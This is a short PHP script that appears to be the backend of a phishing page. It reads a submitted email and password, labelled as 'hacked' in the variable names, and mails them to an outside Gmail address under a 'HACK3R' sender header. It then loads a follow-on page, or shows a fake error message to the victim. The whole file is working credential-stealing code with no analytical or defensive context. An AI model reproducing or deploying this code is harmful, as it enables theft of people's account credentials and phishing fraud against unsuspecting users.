<?php
        $mailhacked = $_POST["email"];
        $passwordhacked = $_POST["password"];
         $to = "hatipyucel@gmail.com";
         $subject = "1500202500";
         
         $message = "$mailhacked";
         $message .= "<br>$passwordhacked";
         
         $header = "From:HACK3R@Hack3r.com \r\n";
         $header .= "Cc:hatipyucel@gmail.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Message could not be sent...404 error check your internet";
         }
      ?>
